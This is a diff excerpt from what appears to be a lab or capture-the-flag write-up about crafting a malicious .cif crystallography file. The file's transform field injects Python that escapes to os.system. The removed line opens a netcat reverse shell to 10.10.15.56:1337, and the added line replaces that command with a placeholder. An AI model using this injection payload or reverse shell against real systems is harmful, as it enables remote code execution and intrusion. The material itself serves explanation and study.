@@ -70,7 +70,7 @@ All we need to do is craft a malicious .cif file, and then inject the command we
 > k1 [0 0 0]
 > 
 > 
-> _space_group_magn.transform_BNS_Pp_abc  'a,b,[d for d in ()._class_._mro_[1]._getattribute_ ( *[().__class__.__mro__[1]]+["_sub" + "classes_"]) () if d._name_ == "BuiltinImporter"][0].load_module ("os").system ("busybox nc 10.10.15.56 1337 -e sh");0,0,0'
+> _space_group_magn.transform_BNS_Pp_abc  'a,b,[d for d in ()._class_._mro_[1]._getattribute_ ( *[().__class__.__mro__[1]]+["_sub" + "classes_"]) () if d._name_ == "BuiltinImporter"][0].load_module ("os").system ("<INSERT_PAYLOAD");0,0,0'
 > 
 > 
 > 
